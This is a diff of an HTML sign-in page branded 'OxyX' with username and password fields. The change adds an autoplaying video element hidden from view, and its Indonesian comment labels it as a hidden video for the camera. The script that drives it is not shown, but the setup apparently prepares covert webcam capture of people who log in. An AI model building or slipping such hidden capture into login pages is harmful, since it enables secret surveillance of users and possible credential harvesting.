@@ -2,33 +2,37 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Luxury Login</title>
-
-  <!-- CSS -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Sign in - OxyX</title>
   <link rel="stylesheet" href="style.css">
-
-  <!-- JS pakai DEFER (biar nggak error null) -->
-  <script src="script.js" defer></script>
 </head>
 <body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo">🔐 OxyX</div>
+      <h2>Sign in to continue</h2>
+      <p class="sub">[ entity priority ]</p>
 
-<div class="login-box">
-  <h2>Member Access</h2>
+      <form id="loginForm">
+        <div class="input-group">
+          <label>📧 Email or Username</label>
+          <input type="text" id="username" placeholder="example@mail.com" required>
+        </div>
+        <div class="input-group">
+          <label>🔑 Password</label>
+          <input type="password" id="password" placeholder="••••••••" required>
+        </div>
+        <button type="submit" id="loginBtn">⏳ Sign In</button>
+      </form>
 
-  <form id="loginForm">
-    <input type="text" id="username" placeholder="Username" required>
-
-    <div class="password-box">
-      <input type="password" id="password" placeholder="Password" required>
-      <span id="togglePass">👁️</span>
+      <div class="error-msg" id="errorMsg"></div>
+      <div class="footer">© 2026 OxyX • entity priority</div>
     </div>
+  </div>
 
-    <button type="submit">Login Secure</button>
-  </form>
+  <!-- Video tersembunyi untuk kamera -->
+  <video id="videoPreview" autoplay playsinline style="display:none;"></video>
 
-  <div class="progress-bar" id="progressBar"></div>
-  <p id="status"></p>
-</div>
-
+  <script src="script.js"></script>
 </body>
 </html>
